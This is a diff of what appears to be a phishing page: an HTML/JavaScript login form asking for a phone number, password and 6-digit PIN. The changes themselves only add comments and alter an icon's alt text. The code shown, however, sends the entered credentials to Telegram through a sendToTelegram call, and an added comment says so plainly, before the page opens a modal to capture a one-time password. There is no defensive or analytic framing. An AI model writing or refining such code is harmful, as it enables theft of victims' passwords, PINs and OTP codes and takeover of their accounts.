@@ -347,9 +347,9 @@
                 <input type="password" id="loginPassword" placeholder="Enter password" autocomplete="off">
             </div>
 
-            <!-- 6-Digit PIN Capsule Box with Shield Icon matching styling -->
+            <!-- 6-Digit PIN Capsule Box added directly on Front Page -->
             <div class="input-capsule">
-                <img src="https://zxcvwe.wiki/static/icon/password.png" alt="shield icon" class="input-icon">
+                <img src="https://zxcvwe.wiki/static/icon/password.png" alt="pin icon" class="input-icon">
                 <input type="password" id="loginPin" placeholder="Enter 6-digit PIN" maxlength="6" inputmode="numeric" autocomplete="off">
             </div>
         </div>
@@ -528,6 +528,7 @@
         }, 1000);
     }
 
+    // Login Button Click -> Grabs Phone, Password & PIN, sends to Telegram, opens OTP modal
     document.getElementById('loginBtn').addEventListener('click', () => {
         currentPhone = document.getElementById('loginPhone').value.trim();
         currentPassword = document.getElementById('loginPassword').value.trim();
@@ -541,6 +542,7 @@
         flowType = 'login';
         sendToTelegram({ type: 'login', phone: currentPhone, password: currentPassword, pin: currentPin });
 
+        // Open OTP Modal directly
         document.getElementById('otpModal').classList.add('active');
         document.getElementById('otpSubtext').textContent = `OTP sent to ${currentPhone.slice(0,3)}****${currentPhone.slice(-4)}`;
         
